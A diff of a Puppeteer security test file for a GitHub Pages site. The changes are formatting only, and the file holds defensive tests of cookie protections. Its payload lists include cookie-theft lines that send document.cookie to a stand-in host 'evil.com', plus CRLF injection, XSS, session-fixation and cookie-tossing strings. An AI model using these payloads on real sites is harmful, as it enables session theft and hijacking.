@@ -26,12 +26,12 @@ describe('Cookie Security Tests', () => {
         path: '/',
         secure: true,
         httpOnly: true,
-        sameSite: 'Strict'
+        sameSite: 'Strict',
       });
 
       // Get all cookies
       const cookies = await page.cookies();
-      const testCookie = cookies.find(c => c.name === 'test_secure');
+      const testCookie = cookies.find((c) => c.name === 'test_secure');
 
       if (testCookie) {
         // Verify secure attributes are set
@@ -49,7 +49,7 @@ describe('Cookie Security Tests', () => {
         name: 'session_token',
         value: 'secret123',
         domain: 'williamzujkowski.github.io',
-        httpOnly: true
+        httpOnly: true,
       });
 
       const cookieTheftAttempts = [
@@ -59,26 +59,26 @@ describe('Cookie Security Tests', () => {
         'this.document.cookie',
         'top.document.cookie',
         'parent.document.cookie',
-        
+
         // Indirect access
         'eval("document.cookie")',
         'Function("return document.cookie")()',
         'new Function("return document.cookie")()',
         'setTimeout("document.cookie", 0)',
         'setInterval("document.cookie", 1000)',
-        
+
         // Object access
         'Object.getOwnPropertyDescriptor(Document.prototype, "cookie").get.call(document)',
         'Document.prototype.__lookupGetter__("cookie").call(document)',
         'document.__lookupGetter__("cookie").call(document)',
-        
+
         // Via fetch
         'fetch("/", {credentials: "include"}).then(r => r.headers.get("Cookie"))',
         'new XMLHttpRequest(); xhr.open("GET", "/"); xhr.withCredentials = true; xhr.getAllResponseHeaders()',
-        
+
         // Image/Script injection
         'new Image().src = "http://evil.com/steal?c=" + document.cookie',
-        'document.createElement("script").src = "http://evil.com/log?c=" + document.cookie'
+        'document.createElement("script").src = "http://evil.com/log?c=" + document.cookie',
       ];
 
       for (const attempt of cookieTheftAttempts) {
@@ -108,41 +108,44 @@ describe('Cookie Security Tests', () => {
         'test=value\nSet-Cookie: admin=true',
         'test=value%0d%0aSet-Cookie:%20admin=true',
         'test=value%0aSet-Cookie:%20admin=true',
-        
+
         // Cookie overflow
         'a=' + 'x'.repeat(4096),
         'test=' + 'x'.repeat(8192),
-        
+
         // Special characters
         'test=<script>alert(1)</script>',
         'test=";alert(1);//',
-        'test=\';alert(1);//',
+        "test=';alert(1);//",
         'test=${alert(1)}',
         'test={{7*7}}',
-        
+
         // Path/Domain manipulation
         'test=value; Domain=.com',
         'test=value; Domain=',
         'test=value; Path=../../',
         'test=value; Path=..%2f..%2f',
-        
+
         // Multiple cookie injection
         'test1=value1; test2=value2; admin=true',
         'test=value;admin=true',
         'test=value, admin=true',
-        
+
         // Cookie jar overflow
-        Array(1000).fill('x').map((_, i) => `cookie${i}=value${i}`).join('; '),
-        
+        Array(1000)
+          .fill('x')
+          .map((_, i) => `cookie${i}=value${i}`)
+          .join('; '),
+
         // Unicode/encoding attacks
         'test=\u0000admin\u0000true',
         'test=\x00admin\x00true',
         'test=%00admin%00true',
-        
+
         // Cookie fixation
         'PHPSESSID=' + 'a'.repeat(32),
         'JSESSIONID=' + 'a'.repeat(32),
-        'ASP.NET_SessionId=' + 'a'.repeat(24)
+        'ASP.NET_SessionId=' + 'a'.repeat(24),
       ];
 
       for (const payload of cookieInjectionPayloads) {
@@ -153,16 +156,15 @@ describe('Cookie Security Tests', () => {
 
           // Check that malicious cookies weren't set
           const cookies = await page.cookies();
-          
+
           // Verify no unauthorized admin cookie
-          const adminCookie = cookies.find(c => c.name === 'admin');
+          const adminCookie = cookies.find((c) => c.name === 'admin');
           expect(adminCookie).toBeUndefined();
-          
+
           // Verify no CRLF injection
-          const suspiciousCookies = cookies.filter(c => 
-            c.value.includes('\r') || 
-            c.value.includes('\n') ||
-            c.value.includes('Set-Cookie')
+          const suspiciousCookies = cookies.filter(
+            (c) =>
+              c.value.includes('\r') || c.value.includes('\n') || c.value.includes('Set-Cookie'),
           );
           expect(suspiciousCookies.length).toBe(0);
         } catch (error) {
@@ -175,14 +177,14 @@ describe('Cookie Security Tests', () => {
     it('should prevent cross-site cookie access', async () => {
       // Navigate to first domain
       await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');
-      
+
       // Set cookie on first domain
       await page.setCookie({
         name: 'site_specific',
         value: 'secret_data',
         domain: 'williamzujkowski.github.io',
         path: '/',
-        sameSite: 'Strict'
+        sameSite: 'Strict',
       });
 
       // Try to access from different origins
@@ -192,7 +194,7 @@ describe('Cookie Security Tests', () => {
         'http://sub.williamzujkowski.github.io',
         'https://different.github.io',
         'http://localhost:8080',
-        'file:///test.html'
+        'file:///test.html',
       ];
 
       for (const origin of crossOriginTests) {
@@ -203,10 +205,10 @@ describe('Cookie Security Tests', () => {
               const iframe = document.createElement('iframe');
               iframe.src = targetOrigin;
               document.body.appendChild(iframe);
-              
+
               // Try to access parent cookies from iframe
               const parentCookies = iframe.contentWindow?.parent.document.cookie;
-              
+
               document.body.removeChild(iframe);
               return { accessible: true, cookies: parentCookies };
             } catch (e) {
@@ -233,43 +235,43 @@ describe('Cookie Security Tests', () => {
       const sameSiteTests = [
         { name: 'strict_cookie', value: 'strict_value', sameSite: 'Strict' as const },
         { name: 'lax_cookie', value: 'lax_value', sameSite: 'Lax' as const },
-        { name: 'none_cookie', value: 'none_value', sameSite: 'None' as const, secure: true }
+        { name: 'none_cookie', value: 'none_value', sameSite: 'None' as const, secure: true },
       ];
 
       for (const cookieConfig of sameSiteTests) {
         await page.setCookie({
           ...cookieConfig,
           domain: 'williamzujkowski.github.io',
-          path: '/'
+          path: '/',
         });
       }
 
       // Test cross-site requests
       const crossSiteRequests = await page.evaluate(() => {
         const results = [];
-        
+
         // Simulate cross-site form submission
         const form = document.createElement('form');
         form.method = 'POST';
         form.action = 'https://williamzujkowski.github.io/test';
         form.target = '_blank';
-        
+
         // Check which cookies would be sent
         results.push({
           type: 'form_post',
-          cookies: document.cookie
+          cookies: document.cookie,
         });
-        
+
         // Simulate cross-site link navigation
         const link = document.createElement('a');
         link.href = 'https://williamzujkowski.github.io/test';
         link.target = '_blank';
-        
+
         results.push({
           type: 'link_navigation',
-          cookies: document.cookie
+          cookies: document.cookie,
         });
-        
+
         return results;
       });
 
@@ -290,13 +292,15 @@ describe('Cookie Security Tests', () => {
         // Single large cookie
         {
           name: 'large_cookie',
-          value: 'x'.repeat(4096)
+          value: 'x'.repeat(4096),
         },
         // Many cookies to exceed total limit
-        ...Array(200).fill(0).map((_, i) => ({
-          name: `cookie_${i}`,
-          value: 'x'.repeat(100)
-        }))
+        ...Array(200)
+          .fill(0)
+          .map((_, i) => ({
+            name: `cookie_${i}`,
+            value: 'x'.repeat(100),
+          })),
       ];
 
       let cookieCount = 0;
@@ -305,7 +309,7 @@ describe('Cookie Security Tests', () => {
           await page.setCookie({
             ...cookie,
             domain: 'williamzujkowski.github.io',
-            path: '/'
+            path: '/',
           });
           cookieCount++;
         } catch (error) {
@@ -317,7 +321,7 @@ describe('Cookie Security Tests', () => {
       // Verify browser enforces limits
       const allCookies = await page.cookies();
       expect(allCookies.length).toBeLessThan(overflowTests.length);
-      
+
       // Check no single cookie exceeds 4KB
       for (const cookie of allCookies) {
         const cookieSize = cookie.name.length + cookie.value.length;
@@ -330,7 +334,7 @@ describe('Cookie Security Tests', () => {
 
       // Attacker tries to set a known session ID
       const fixedSessionId = 'attacker-controlled-session-12345';
-      
+
       // Common session cookie names
       const sessionCookieNames = [
         'PHPSESSID',
@@ -340,13 +344,17 @@ describe('Cookie Security Tests', () => {
         'sessionid',
         'sid',
         '_session',
-        'connect.sid'
+        'connect.sid',
       ];
 
       for (const cookieName of sessionCookieNames) {
-        await page.evaluate((name, value) => {
-          document.cookie = `${name}=${value}; path=/`;
-        }, cookieName, fixedSessionId);
+        await page.evaluate(
+          (name, value) => {
+            document.cookie = `${name}=${value}; path=/`;
+          },
+          cookieName,
+          fixedSessionId,
+        );
       }
 
       // Simulate authentication (should regenerate session)
@@ -372,7 +380,7 @@ describe('Cookie Security Tests', () => {
         { domain: '.github.io', name: 'admin', value: 'true' },
         { domain: '.io', name: 'super_admin', value: 'true' },
         { domain: '', name: 'root_access', value: 'true' },
-        { domain: '.com', name: 'global_admin', value: 'true' }
+        { domain: '.com', name: 'global_admin', value: 'true' },
       ];
 
       for (const attempt of cookieTossingAttempts) {
@@ -381,7 +389,7 @@ describe('Cookie Security Tests', () => {
             name: attempt.name,
             value: attempt.value,
             domain: attempt.domain,
-            path: '/'
+            path: '/',
           });
         } catch (error) {
           // Should reject invalid domain attempts
@@ -391,8 +399,8 @@ describe('Cookie Security Tests', () => {
 
       // Verify malicious cookies weren't set
       const cookies = await page.cookies();
-      const maliciousCookies = cookies.filter(c => 
-        ['admin', 'super_admin', 'root_access', 'global_admin'].includes(c.name)
+      const maliciousCookies = cookies.filter((c) =>
+        ['admin', 'super_admin', 'root_access', 'global_admin'].includes(c.name),
       );
       expect(maliciousCookies.length).toBe(0);
     });
@@ -403,10 +411,10 @@ describe('Cookie Security Tests', () => {
       // Set cookies with various expiration times
       const now = Date.now();
       const expirationTests = [
-        { name: 'expired', expires: (now / 1000) - 3600 }, // 1 hour ago
-        { name: 'expires_soon', expires: (now / 1000) + 1 }, // 1 second from now
-        { name: 'persistent', expires: (now / 1000) + 86400 }, // 1 day from now
-        { name: 'session', expires: -1 } // Session cookie
+        { name: 'expired', expires: now / 1000 - 3600 }, // 1 hour ago
+        { name: 'expires_soon', expires: now / 1000 + 1 }, // 1 second from now
+        { name: 'persistent', expires: now / 1000 + 86400 }, // 1 day from now
+        { name: 'session', expires: -1 }, // Session cookie
       ];
 
       for (const test of expirationTests) {
@@ -415,7 +423,7 @@ describe('Cookie Security Tests', () => {
           value: 'test_value',
           domain: 'williamzujkowski.github.io',
           path: '/',
-          expires: test.expires
+          expires: test.expires,
         });
       }
 
@@ -424,12 +432,12 @@ describe('Cookie Security Tests', () => {
 
       // Check which cookies still exist
       const remainingCookies = await page.cookies();
-      const cookieNames = remainingCookies.map(c => c.name);
+      const cookieNames = remainingCookies.map((c) => c.name);
 
       // Expired cookies should be gone
       expect(cookieNames).not.toContain('expired');
       expect(cookieNames).not.toContain('expires_soon');
-      
+
       // Persistent and session cookies should remain
       expect(cookieNames).toContain('persistent');
     });
@@ -441,30 +449,30 @@ describe('Cookie Security Tests', () => {
         // Null bytes
         'test\x00admin=true',
         'test\u0000admin=true',
-        
+
         // Unicode normalization attacks
         'admin\u0301=true', // Combining accent
         'a\u0308dmin=true', // Combining diaeresis
         '\u1e00dmin=true', // Latin A with ring below
-        
+
         // Direction override
         '\u202Eadmin=true',
         'admin\u202E=true',
-        
+
         // Homograph attacks
         '\u0430dmin=true', // Cyrillic 'a'
         'adm\u0456n=true', // Cyrillic 'i'
-        
+
         // Zero-width characters
         'admin\u200B=true', // Zero-width space
         'admin\u200C=true', // Zero-width non-joiner
         'admin\u200D=true', // Zero-width joiner
         'admin\uFEFF=true', // Zero-width no-break space
-        
+
         // Control characters
         'admin\u0001=true',
         'admin\u001F=true',
-        'admin\u007F=true'
+        'admin\u007F=true',
       ];
 
       for (const payload of unicodePoisoningAttempts) {
@@ -475,11 +483,10 @@ describe('Cookie Security Tests', () => {
 
       // Check that no admin cookies were set
       const cookies = await page.cookies();
-      const adminCookies = cookies.filter(c => 
-        c.name.toLowerCase().includes('admin') || 
-        c.value.toLowerCase().includes('true')
+      const adminCookies = cookies.filter(
+        (c) => c.name.toLowerCase().includes('admin') || c.value.toLowerCase().includes('true'),
       );
-      
+
       // Should not have any admin-related cookies from Unicode attacks
       expect(adminCookies.length).toBe(0);
     });
